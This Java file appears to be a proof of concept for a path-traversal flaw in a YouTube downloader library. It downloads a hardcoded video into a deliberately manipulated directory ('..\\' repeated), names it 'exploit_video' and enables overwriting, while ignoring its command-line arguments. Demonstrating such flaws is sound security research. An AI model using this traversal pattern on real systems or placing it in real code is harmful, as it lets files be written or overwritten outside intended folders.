import com.github.kiulian.downloader.YoutubeDownloader;
import com.github.kiulian.downloader.downloader.request.RequestVideoFileDownload;
import com.github.kiulian.downloader.downloader.request.RequestVideoInfo;
import com.github.kiulian.downloader.downloader.response.Response;
import com.github.kiulian.downloader.model.videos.VideoInfo;
import com.github.kiulian.downloader.model.videos.formats.Format;

import java.io.File;

public class Main {

    public static void main(String[] args) {

        // Updated usage instructions
        if (args.length < 2) {
            System.out.println("Usage: java -jar your_program.jar -videoId download_path");
            return; // Exit if no URL or download path is provided
        }

        // Initialize YoutubeDownloader
        YoutubeDownloader downloader = new YoutubeDownloader();

        // The second argument is the videoID to download but it's not used
        //String videoId = args[0]; //videoId is the first argument

        // The second argument is the download path but it's not used in the path manipulation
        // String outputDirPath = args[1];

        // Fetch video information
        RequestVideoInfo requestVideoInfo = new RequestVideoInfo("U96PGrgf8IQ");
        Response<VideoInfo> responseVideoInfo = downloader.getVideoInfo(requestVideoInfo);

        if (responseVideoInfo.ok()) {
            VideoInfo videoInfo = responseVideoInfo.data();

            // Assuming we take the first available format (for simplicity)
            Format format = videoInfo.videoFormats().get(0);

            // The manipulated output directory remains unchanged, ignoring the input "outputDir"
            File outputDir = new File("my_videos\\..\\..\\..\\..\\..\\..\\TestDir");

            RequestVideoFileDownload request = new RequestVideoFileDownload(format)
                    .saveTo(outputDir)// Continue using the hardcoded manipulated output directory
                    .renameTo("exploit_video")  // Attempt to further manipulate the path
                    .overwriteIfExists(true);

            // Execute the download request
            Response<File> response = downloader.downloadVideoFile(request);

            if (response.ok()) {
                File data = response.data();  // The file should be downloaded to the manipulated path
                System.out.println("Downloaded file path: " + data.getAbsolutePath());
            } else {
                System.out.println("Download failed: " + response.error().getMessage());
            }
        } else {
            System.out.println("Failed to fetch video info: " + responseVideoInfo.error().getMessage());
        }
    }






}
